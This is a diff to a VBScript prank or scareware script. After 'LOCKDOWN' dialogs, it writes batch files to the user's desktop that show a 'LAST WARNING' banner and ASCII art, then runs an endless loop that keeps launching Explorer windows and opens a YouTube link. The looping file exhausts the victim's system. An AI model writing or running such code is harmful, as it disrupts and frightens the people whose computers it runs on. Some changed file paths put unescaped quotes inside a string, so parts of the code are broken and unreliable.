@@ -1,7 +1,7 @@
 Dim fso, MyFile, printer, teste
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set objShell = CreateObject("Wscript.Shell")
-Command = "cmd /c start c:\users\('TESTE')\desktop\teste2.bat"
+Command = "cmd /c start c:\users\("USER")\desktop\teste2.bat"
 
 
 
@@ -13,10 +13,21 @@ If intMessage = vbYes Then
 	vbYesNo + vbQuestion, "LOCKDOWN")
 
 if intMessage = vbYes Then
-		Set MyFile = fso.CreateTextFile("c:\users\('TESTE')\desktop\teste2.bat", True)
+		Set MyFile = fso.CreateTextFile("c:\users\("USER")\desktop\teste2.bat", True)
 
 	MyFile.WriteLine("@echo off")
 	MyFile.WriteLine("@echo .")
+	MyFile.WriteLine("@echo    ***********************************************")
+	MyFile.WriteLine("@echo    ***                                         ***")
+	MyFile.WriteLine("@echo    ***         LAST WARNING	     	       ***")
+	MyFile.WriteLine("@echo    ***                                         ***")
+	MyFile.WriteLine("@echo    ***********************************************")
+	MyFile.WriteLine("@echo .")
+
+	MyFile.WriteLine("timeout /t 10 /nobreak")
+	MyFile.WriteLine("start teste3.bat")
+	MyFile.WriteLine("color 0a")
+	MyFile.WriteLine(":top")
 	MyFile.WriteLine("@echo ________________$$$$")
 	MyFile.WriteLine("@echo ______________$$____$$ ")
 	MyFile.WriteLine("@echo ______________$$____$$ ")
@@ -39,24 +50,19 @@ if intMessage = vbYes Then
 	MyFile.WriteLine("@echo _________$$$________________$$$")
 	MyFile.WriteLine("@echo __________$$________________$$")
 	MyFile.WriteLine("@echo __________$$$$$$$$$$$$$$$$$$$$")
-	MyFile.WriteLine("start chrome https://www.youtube.com/watch?v=Ux5cQbO_ybw")
-
-	MyFile.WriteLine("timeout /t 10 /nobreak")
-	MyFile.WriteLine("start teste3.bat")
-	MyFile.WriteLine("color 0a")
-	MyFile.WriteLine(":top")
-	Myfile.WriteLine("echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% ")
 	Myfile.WriteLine("goto top")
 	Wscript.Sleep 1000
 	Set WshShell = CreateObject("WScript.Shell")
 	Set WshShellExec = WshShell.Exec(Command)
 
-		Set MyFile = fso.CreateTextFile("c:\users\('TESTE')\desktop\teste3.bat", True)
+		Set MyFile = fso.CreateTextFile("c:\users\("USER")\desktop\teste3.bat", True)
 	MyFile.WriteLine("@echo off")
 	MyFile.WriteLine("color 3")
 	MyFile.WriteLine(":loop")
-	Myfile.WriteLine("echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% ")
+	Myfile.WriteLine("tree ")
+	Myfile.WriteLine("start explorer")
 	Myfile.WriteLine("goto loop")
+	MyFile.WriteLine("start chrome https://www.youtube.com/watch?v=Ux5cQbO_ybw")
 	Wscript.Quit	
 	
 else
